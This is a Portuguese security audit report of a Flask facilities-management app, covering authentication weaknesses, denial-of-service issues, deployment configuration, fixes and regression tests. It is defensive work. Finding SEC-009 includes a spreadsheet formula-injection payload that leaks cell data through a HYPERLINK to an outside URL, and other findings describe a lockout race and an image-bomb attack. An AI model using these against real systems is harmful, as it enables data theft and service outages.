# Auditoria de segurança: Trino Facilities, Etapa A (descoberta e validação estática)

- **Repositório:** `borbathiago15-oss/facilities`, `main` em `c9e7bf7` (19/10/2026).
- **Modo:** só leitura. Nenhum arquivo do repositório foi alterado.
- **Ambiente dos testes:** cliente de teste Flask com SQLite em memória. As provas de conceito (PoC) da auditoria não foram versionadas; cada correção traz o seu teste de regressão na suíte (veja a seção 8).
- **Fora do escopo:** nenhum teste contra o Railway nem contra produção.

## 1. Resumo executivo

O isolamento entre clientes é o ponto forte do sistema. Das 185 rotas, as 184 passíveis de teste foram varridas com os perfis pleno, supervisor, encarregado, técnico, visualizador, gerente (por contratante) e cliente externo, inclusive cruzando ids de A em objetos de B e conferindo os downloads binários. **Não apareceu nenhum IDOR nem escalonamento de privilégio.** Também não apareceram SQL injection, path traversal, command injection, SSTI, XSS armazenado nem open redirect exploráveis.

O risco real está na **autenticação**. Uma conta `master` enxerga todos os clientes, e hoje ela é protegida só pela senha:
- o MFA é obrigatório apenas para o cliente externo;
- o bloqueio por tentativas pode ser contornado com requisições em paralelo;
- o limite de tentativas fica na memória de cada processo.

Somados, esses três pontos formam a principal cadeia de ataque (SEC-001 + SEC-002 + SEC-004).

Os riscos seguintes são de **disponibilidade**: uma imagem-bomba derruba o PDF do relatório, um terceiro consegue bloquear qualquer conta conhecida, e a API de integração permite gravar no banco sem limite. Por último vêm itens de **configuração de implantação**: contêiner como root no Railway e dependências com CVE.

| Severidade | Qtde |
|---|---|
| Crítico | 0 |
| Alto | 1 |
| Médio | 8 |
| Baixo | 10 |
| Informativo | 6 |

## 2. Superfície de ataque

- **185 rotas** em 22 blueprints. O mapa completo foi gerado a partir de `app.url_map`.
- **Rotas sem login:**
  - `/login`, `/login/codigo` (segunda etapa);
  - `/healthz`, `/sw.js`, manifestos, `/app/instalar`, `/app/versao`;
  - `/q/<codigo>`, `POST /q/<codigo>/ocorrencia`, `/q/<codigo>/acompanhar/<token>` (QR público);
  - `/api/integracao/v1/*` (6 rotas, chave Bearer);
  - `POST /rotas/agendador` (token Bearer; 404 sem `AGENDADOR_TOKEN`);
  - `/app/sessao`, que devolve 401 sem sessão;
  - `/static/*`.
- **Rotas que não existem:** recuperação de senha por e-mail (o administrador emite senha temporária) e login de cliente por código separado (o cliente usa o login normal, com TOTP obrigatório).
- **Administrativas (só `master`):** `/admin/*`, `/cadastros/{empresas,clientes,estados,trilha}`, `/admin/integracao`.
- **Portal do cliente:** só `portal.*`, negado por padrão (`facilities/__init__.py:284-318`), desligado com `CLIENTE_EXTERNO_LIBERADO=0`.
- **Tarefas agendadas:** `flask agendador rodar` (cron do Railway) ou a rota HTTP com token, protegida por `pg_try_advisory_xact_lock`.

## 3. Achados

Os IDs seguem a ordem de prioridade. "Confirmado (teste)" quer dizer que uma PoC rodou e mostrou o comportamento. "Confirmado (código)" quer dizer que o fluxo foi rastreado sem execução.

### SEC-001: MFA opcional para perfis privilegiados (master, gerente, pleno, visualizador)
- **Severidade:** ALTO. **Status:** confirmado (código).
- **Local:** a única exigência de segunda etapa está em `facilities/__init__.py:303-311`, dentro do bloco do perfil `cliente`. O login em `facilities/core/auth.py:129-139` só pede o código se `u.totp_ativo`.
- **Evidência:**
  ```python
  if u.totp_ativo and u.totp_segredo:   # auth.py:129, MFA só se a pessoa ativou
      ...
  return _concluir_login(u, ...)        # senão entra só com a senha
  ```
- **Cenário:** basta descobrir a senha de um `master` (por reuso, phishing ou força bruta, ver SEC-002 e SEC-004) para ter leitura e escrita em todos os clientes, contas e chaves de integração. Também há risco de "primeiro uso": quem entra primeiro com uma senha temporária vazada consegue cadastrar o próprio autenticador (`auth.py:223-254`).
- **Impacto:** confidencialidade e integridade de todos os clientes.
- **Validação:** leitura do fluxo completo. Não há outra checagem de `totp_ativo`.
- **Correção:** estender a regra que já existe para o cliente (before_request que manda para `/conta/seguranca`) aos perfis `master`, `gerente`, `pleno` e `visualizador`, com prazo de adesão. Subir a `session_epoch` ao ativar o TOTP.
- **Teste de regressão:** um `master` sem TOTP tenta GET `/admin/usuarios` e é redirecionado para a tela de segurança. Depois de ativar o TOTP, acessa normalmente.
- **Prioridade:** 1.

### SEC-002: o bloqueio por tentativas pode ser contornado com requisições em paralelo
- **Severidade:** MÉDIO, e ALTO em cadeia com SEC-001. **Status:** confirmado (teste: `audit_auth/test_race.py`, em SQLite).
- **Local:** `facilities/core/auth.py:113-118`.
- **Evidência:**
  ```python
  u.failed_login_count = (u.failed_login_count or 0) + 1   # ler-somar-gravar sem trava
  ```
- **Cenário:** 12 senhas erradas enviadas ao mesmo tempo terminaram com `failed_login_count == 1` e sem bloqueio, nas 3 execuções. Em produção são 2 workers com 4 threads cada (`docker-entrypoint.sh:12`), então rajadas de ~8 contam como uma falha. Que o Postgres em READ COMMITTED perde a atualização do mesmo jeito é inferência, sem teste.
- **Impacto:** o teto real de tentativas passa a ser só o limitador, que também é fraco (SEC-004).
- **Correção:** UPDATE atômico (`SET failed_login_count = failed_login_count + 1 ... RETURNING`) ou `with_for_update()`.
- **Teste de regressão:** N threads com senha errada deixam o contador em N, ou a conta bloqueada.
- **Prioridade:** 2.

### SEC-003: o limite de 5 códigos TOTP errados fica no cookie e é zerado repetindo o cookie
- **Severidade:** MÉDIO (exige a senha). **Status:** confirmado (teste: `audit_cfg/poc_2fa.py` e `audit_auth/test_A`).
- **Local:** `facilities/core/auth.py:131-136` (cria `session['_2fa']` com `'erros': 0`) e `auth.py:188-201` (conta os erros nesse cookie).
- **Cenário:**
  - Quem tem a senha guarda o cookie emitido logo depois do passo da senha e o reenvia a cada tentativa: 12 ou mais códigos errados passaram sem bloqueio.
  - Refazer o passo da senha também zera os erros e ainda zera `failed_login_count` (`auth.py:126-128`).
  - O único freio é `10 per minute` por IP (`auth.py:180`), que fica em memória (SEC-004).
- **Impacto:** a força bruta no TOTP fica viável com vários IPs (~1/333 mil por tentativa), o que anula o MFA justamente quando a senha vazou.
- **Correção:** contador de falhas de TOTP no servidor (colunas em `users`), com bloqueio por conta, sem zerar no login por senha. Somar limite por `uid` pendente.
- **Teste de regressão:** repetir o cookie em 6 POSTs errados: o sexto é recusado. Logar de novo não zera o contador.
- **Prioridade:** 3.

### SEC-004: o limite de tentativas fica na memória de cada processo e o Redis não pode ser ligado
- **Severidade:** MÉDIO. **Status:** confirmado (código + boot testado: `audit_cfg/redis_try.py`).
- **Local:** `facilities/__init__.py:178-181` (`RATELIMIT_STORAGE_URI` padrão `memory://`); `requirements.txt` não traz o pacote `redis`.
- **Evidência:** subir com `RATELIMIT_STORAGE_URI=redis://...` falha com `ConfigurationError: 'redis' prerequisite not available`.
- **Cenário:**
  - Com `WEB_CONCURRENCY=2`, todos os limites valem o dobro: login, código, QR e integração.
  - Cada deploy zera os contadores.
  - Mais réplicas multiplicam o limite.
  - O guia do Railway não configura um armazenamento compartilhado.
- **Correção:** incluir `redis` nas dependências, provisionar Redis no Railway e exigir armazenamento compartilhado quando `EXIGIR_DATABASE_URL` estiver ligado.
- **Prioridade:** 4.

### SEC-005: imagem-bomba derruba a geração do PDF do relatório
- **Severidade:** MÉDIO (disponibilidade). **Status:** confirmado (teste: `audit_files/bomb_rgb.py`).
- **Local:**
  - O upload só confere a assinatura do arquivo, sem decodificar: `facilities/rotas/servico.py:737-749` (`ler_imagem`) e `facilities/chamados/rotas.py:236-268`.
  - O PDF decodifica a imagem: `facilities/relatorios/arquivos.py:85-90` (`_imagem` → `ImageReader`).
  - `MAX_IMAGE_PIXELS` não aparece em nenhum lugar do código.
- **Evidência:** um PNG de 493 KB com 13000×13000 px consumiu **1,69 GB de RAM e 11,1 s** em um PDF.
- **Cenário:** um encarregado ou técnico envia a foto pelo checklist. A amostra automática do relatório a escolhe sozinha. Cada download do PDF, inclusive pelo portal do cliente, estoura memória ou o timeout de 60 s do gunicorn.
- **Correção:**
  - Reduzir `PIL.Image.MAX_IMAGE_PIXELS` (~40 MP) no boot.
  - Recusar dimensões grandes no upload (abrir só o cabeçalho com Pillow).
  - Conferir `getSize()` antes de montar a imagem no PDF.
- **Teste de regressão:** o PNG de 13000² é recusado no upload, e um PDF com 9 fotos fica pronto em menos de N segundos.
- **Prioridade:** 5.

### SEC-006: o limite da API de integração é escolhido pelo atacante, e cada 401 grava uma linha no banco
- **Severidade:** MÉDIO. **Status:** confirmado (teste: `audit_cfg/poc_rl.py`).
- **Local:** `facilities/integracao/api.py:27-30` (a chave do limite usa o prefixo enviado no cabeçalho, antes de validar a chave) e `:35-38` (`registrar_acesso` + commit em todo 401).
- **Evidência:**
  - 700 requisições de um IP com prefixos falsos aleatórios: 700 respostas 401, nenhum 429 e 700 linhas em `integracao_acessos`.
  - Com um prefixo real (8 hex, visível na tela de administração), 600 tentativas esgotam a cota de 600/h da chave legítima.
- **Impacto:**
  - O banco cresce sem limite (a tabela não tem retenção).
  - O histórico de acessos fica poluído (a tela mostra só os últimos 100).
  - A integração com o Intelligence pode ser derrubada.
- **Correção:** usar o prefixo como chave do limite só depois de validar a chave. Para 401, limitar por IP com teto baixo. Agregar ou amostrar o log de 401 e definir retenção.
- **Prioridade:** 6.

### SEC-007: qualquer pessoa consegue bloquear uma conta conhecida
- **Severidade:** MÉDIO (disponibilidade). **Status:** confirmado (teste: `audit_cfg/poc_lock.py`).
- **Local:** `facilities/core/auth.py:113-117`. São 5 erros para bloquear 15 min, e o ciclo pode se repetir sem fim.
- **Cenário:** um terceiro mantém o `master` trancado a cada 15 minutos.
- **Correção:**
  - Atraso progressivo em vez de trava rígida, ou trava por (conta, IP).
  - Senha certa + TOTP passam mesmo durante a trava. Isso depende de SEC-001.
  - Avisar o administrador quando uma conta for bloqueada.
- **Prioridade:** 7, e deve ser feito junto com SEC-002.

### SEC-008: contêiner como root no Railway e código gravável pelo usuário do app
- **Severidade:** MÉDIO (risco de configuração). **Status:** confirmado (código).
- **Local:** `docs/DEPLOY_RAILWAY.md:43,51` (`RAILWAY_RUN_UID=0`) e `Dockerfile:26` (`COPY --chown=facilities . .`).
- **Cenário:** qualquer falha de execução de código ganha root dentro do contêiner e pode alterar os `.py`, persistindo até o próximo deploy.
- **Correção:**
  - Código pertencente ao root e só leitura.
  - Só `/data/uploads` gravável: o entrypoint ajusta o dono do volume e larga os privilégios.
  - Remover `RAILWAY_RUN_UID=0`.
- **Prioridade:** 8, antes da produção.

### SEC-009: injeção de fórmula no Excel do relatório do cliente
- **Severidade:** BAIXO/MÉDIO. **Status:** confirmado (teste).
- **Local:** `facilities/relatorios/arquivos.py:224-229` (`aba` → `ws.append`). Os dados vêm do título do chamado (`relatorios/cliente.py:120`), do texto do item do checklist (`:144`) e dos nomes de ambiente e local.
- **Evidência:** o openpyxl gravou `=HYPERLINK(...)` como fórmula (`data_type == 'f'`).
- **Cenário:** um usuário interno abre um chamado com o título `=HYPERLINK("https://…?x="&A2,"Clique")`. O Excel baixado pela gestão e pelo cliente executa a fórmula.
- **Correção:** prefixar `'` (ou forçar o tipo texto) nas células que começam com `= + - @ \t \r`.
- **Prioridade:** 9.

### SEC-010: a inscrição de push sobrevive ao logout em celular compartilhado
- **Severidade:** BAIXO/MÉDIO. **Status:** confirmado (teste: `audit_authz/t/test_alvos.py`).
- **Local:** `facilities/core/auth.py:208-218` (o logout não remove a `PushInscricao`) e `core/push.py:174-183`.
- **Cenário:** um gestor entra no celular do posto, permite as notificações e sai. O aparelho continua recebendo avisos dele, com título de chamado, local e "Urgente", até outra pessoa entrar e abrir o app.
- **Correção:** apagar a inscrição do aparelho no logout. O cliente envia o endpoint, ou o JS chama DELETE `/app/api/push` antes do POST `/logout`.
- **Prioridade:** 10.

### Achados de menor prioridade (todos confirmados, salvo indicação)

| ID | Sev. | Achado | Local |
|---|---|---|---|
| SEC-011 | Baixo | `/trocar-senha` e `/conta/seguranca/desativar` conferem a senha atual sem limite e sem contador: quem tem a sessão descobre a senha por tentativa | `core/auth.py:266`, `:285` |
| SEC-012 | Baixo | Política de senha só exige 8 caracteres: sem lista de senhas comuns e sem limite máximo | `core/auth.py:33`, `:287` |
| SEC-013 | Baixo | O login não limpa a sessão. Ela é assinada, mas não cifrada, e expõe `_totp_novo` durante o cadastro do TOTP. Sem prazo absoluto nem por inatividade (31 dias de cookie, 14 de "lembrar") | `core/auth.py:147-159`, `:228` |
| SEC-014 | Baixo | Telas de quem está logado sem `Cache-Control: no-store`. A foto de referência e o POP vão com `max-age` de 1 a 7 dias, o que pesa em celular compartilhado | `__init__.py` (`_cabecalhos`), `rotas/telas.py:287,660` |
| SEC-015 | Baixo | Dependências com aviso no pip-audit: `cryptography 46.0.3` (8 avisos; correção em ≥ 50.0.0) e `Werkzeug 3.1.6` (`safe_join` só no Windows; correção em 3.1.9). Uso atual com pouca exposição: só VAPID em P-256, contêiner Linux | `requirements.txt:10,19` |
| SEC-016 | Baixo | `PROXY_HOPS` maior que o número real de proxies permite forjar o IP e anular todos os limites. O valor 1 do guia só vale se o Railway for o único proxy (não verificado) | `__init__.py:79-110` |
| SEC-017 | Baixo | O segredo do TOTP fica em texto puro no banco e, portanto, nos backups do `pg_dump` | `core/models.py:152` |
| SEC-018 | Baixo | Corrida no reuso do código TOTP: dois POSTs simultâneos com o mesmo código podem passar (hipótese, não testado) | `core/auth.py:189-204` |
| SEC-019 | Baixo | Chave da foto de referência não amarrada ao checklist: quem já conhecia a chave (128 bits) de A lê a foto depois de perder o acesso | `rotas/servico.py:79,117` |
| SEC-020 | Baixo | O catálogo de materiais é global, e qualquer gestor desativa ou renomeia material usado por outro cliente. Decisão registrada em `docs/CONTINUIDADE.md:162` | `materiais/telas.py:82-112` |
| SEC-021 | Info | JSON de tipo inesperado gera 500, sem vazar dados, em `/app/api/*` e `/passagem-de-turno/api/*` | ex.: `passagem/rotas.py:472` |
| SEC-022 | Info | `isdigit()` seguido de `int()` gera 500 com `'²'`. Também há `int(form['modelo_id'])` sem tratamento | `rotas/telas.py:181,221` e outros |
| SEC-023 | Info | O CI não declara `permissions:`, e as actions são fixadas por tag, não por SHA | `.github/workflows/ci.yml` |
| SEC-024 | Info | O CSP ainda tem `style-src 'unsafe-inline'` (já planejado) | `__init__.py:52-57` |
| SEC-025 | Info | Nome do local com caractere fora do Latin-1 quebra o download do relatório: o cabeçalho é montado à mão | `relatorios/telas.py:82-93` |
| SEC-026 | Info | O portal abre por id um chamado ou foto além das janelas de 90 e 30 dias da lista. É dado do próprio cliente | `portal/telas.py:109,145` |

## 4. Verificado e correto (com evidência)

- **Isolamento entre clientes:**
  - Toda busca por id passa por `require_client` ou pela carteira, e depois pela checagem de perfil. Vale para todos os downloads: anexos, fotos de execução, visita, ocorrência e pedido, referência, POP, etiquetas, PDF e XLSX do relatório e portal.
  - A varredura ampliada (todas as tabelas, bytes binários, visualizador, gerente por contratante, B com os próprios objetos e ids de A) passou: 17 testes.
- **Escalonamento vertical:** só o `master` cria usuários e muda perfil, carteira ou `all_clients`. Não há edição de perfil por conta própria.
- **Sessão:**
  - `get_id()` = `id:epoca`, conferido a cada requisição (`__init__.py:265-276`).
  - Sair, trocar a senha, redefinir pelo admin e desativar sobem a época, o que invalida a sessão e o cookie "lembrar".
  - Mudança de perfil ou carteira vale na hora.
- **Senhas:**
  - Hash scrypt.
  - Hash falso para e-mail que não existe; mesma mensagem e status em todos os casos de recusa.
  - Senha temporária com ~70 bits.
  - `must_change_password` aplicado em todo o app.
- **Cookies:** `Secure`, `HttpOnly`, `SameSite=Lax`. Valor desconhecido em `SESSION_COOKIE_SECURE` impede o boot. Sem `SECRET_KEY`, a aplicação não sobe fora do SQLite de desenvolvimento.
- **CSRF:** `CSRFProtect` global. Toda a `/app/api` exige token. A única isenção é `/rotas/agendador`, que usa Bearer + `compare_digest`.
- **Cabeçalhos:** CSP sem `unsafe-eval` e sem script embutido, nosniff, `X-Frame-Options`, HSTS, `Referrer-Policy`, `Permissions-Policy`. Sem CORS. As páginas de erro não vazam traceback.
- **Arquivos:**
  - Chaves de armazenamento sempre montadas no servidor (uuid4 + extensão da lista permitida).
  - A única chave vinda do formulário (`foto_ref`) passa por regex ancorada depois do `strip`, então não há traversal.
  - Assinatura (magic bytes) conferida, tamanho e quantidade limitados.
  - PDF e Office vão como anexo. Sem SVG.
- **Injeções:** só ORM e parâmetros ligados; nenhum `eval`, `exec`, `subprocess`, `pickle` nem `render_template_string`. Autoescape ligado; os `innerHTML` do JS passam por `esc()`. O `next` do login é validado.
- **QR e integração:**
  - QR e token de acompanhamento com 128 bits.
  - Chave de integração com 256 bits, guardada como SHA-256, comparada com `compare_digest`, limitada aos locais da chave e revogada na hora.
- **Histórico do git:** nenhum segredo real versionado; só valores de teste e CI.

## 5. Matriz de autorização (extraída do código e confirmada pelas varreduras)

Todas as células estão limitadas à carteira da pessoa. O `master` e quem tem `all_clients` veem tudo.

| Módulo / operação | master | gerente / pleno | supervisor | encarregado / técnico | visualizador | cliente |
|---|---|---|---|---|---|---|
| Administração (usuários, locais, empresas, chaves) | sim | não | não | não | não | não |
| Cadastros do local | edita | edita | não | não | lê | não |
| Passagem: lançar | sim | sim | sim | sim | lê | não |
| Passagem: configurar | sim | sim | com permissão | com permissão | não | não |
| Chamados: ver, abrir, comentar | sim | sim | sim | sim | só ver | não |
| Chamados: atribuir, prioridade, cancelar | sim | sim | não | não | não | não |
| Chamados: iniciar, resolver | sim | sim | se responsável | se responsável | não | não |
| Rotas e checklists: montar | sim (biblioteca só o master) | sim | não | não | não | não |
| Rotas: acompanhar | sim | sim | sim | não | sim | não |
| Rotas: executar | sim | sim | sim | sim | não | não |
| Preventiva, equipes, visitas: montar | sim | sim | não | não | não | não |
| Materiais: catálogo | edita (todos os clientes) | edita (todos os clientes) | lê | não | lê | não |
| Materiais: entrada, saída, ajuste | sim | sim | não | não | não | não |
| Painel e relatórios: ler | sim | sim | sim | não | sim | não |
| Relatórios: liberar ao cliente | sim | sim | não | não | não | não |
| Portal (locais ativos do próprio contratante) | não | não | não | não | não | ver, cobrar |
| API de integração | chave Bearer limitada aos locais da chave | | | | | |

## 6. Plano de correção sugerido (Etapa D, depende de autorização)

| Bloco | Achados | Esforço | Migração? |
|---|---|---|---|
| A. Login forte | SEC-001, 002, 003, 007, 011, 018 | médio (1 PR) | sim: colunas de falhas e trava do TOTP em `users` |
| B. Limites compartilhados | SEC-004, 006, 016 | pequeno + infra (Redis no Railway) | não (talvez retenção de `integracao_acessos`) |
| C. Arquivos e relatório | SEC-005, 009, 014, 019, 025 | pequeno | não |
| D. Implantação | SEC-008, 015, 023 | pequeno | não |
| E. Sessão e higiene | SEC-010, 012, 013, 017, 021, 022 | médio | sim, se o segredo do TOTP passar a ser cifrado (SEC-017) |
| Decisão do dono | SEC-020, 026, prazo de adesão ao MFA | — | — |

## 7. Limitações e o que não foi verificado

- Os testes rodaram em SQLite. A perda de atualização em Postgres (SEC-002) é inferida, não medida.
- O comportamento real do proxy do Railway (`X-Forwarded-For`, número de saltos) não foi verificado.
- Não foi feito nenhum teste contra o ambiente publicado: nem carga, nem varredura DAST. O HawkScan não rodou, porque falta `HAWK_API_KEY`.
- Varredura de vulnerabilidades da imagem base (`python:3.11-slim`) e do SO: não foi feita.
- As configurações do Railway (variáveis, acesso ao painel, backups) e do GitHub (proteção de branch, permissões padrão do token) dependem de verificação manual.

## 8. Situação das correções

Decisões do dono em 19/10/2026: blocos A e C agora; bloco D antes da produção; segunda etapa obrigatória para toda a gestão (master, gerente, pleno, visualizador).

| Bloco | Achados | Situação | Testes de regressão |
|---|---|---|---|
| A. Login forte | SEC-001, 002, 003, 007, 011, 018 | corrigido (migração `2d942c7ab282`) | `tests/test_seguranca_login.py` |
| C. Arquivos e relatório | SEC-005, 009, 014, 019, 025 | corrigido | `tests/test_seguranca_arquivos.py` |
| D. Implantação | SEC-008, 015, 023 (+ fixar o `pillow`, dependência do reportlab sem versão fixa) | antes da produção | — |
| B. Limites compartilhados | SEC-004, 006, 016 | a decidir (precisa de Redis no Railway) | — |
| E. Sessão e higiene | SEC-010, 012, 013, 017, 021, 022 | a decidir | — |

SEC-007 foi tratado em parte. O bloqueio continua a valer para qualquer pessoa que errar a senha 5 vezes, e o administrador passa a ser avisado no sino e no celular. A alternativa, deixar entrar com a senha certa durante o bloqueio, devolveria a quem tenta adivinhar a confirmação de que acertou a senha. O bloqueio por conta + IP depende do armazenamento compartilhado do bloco B.
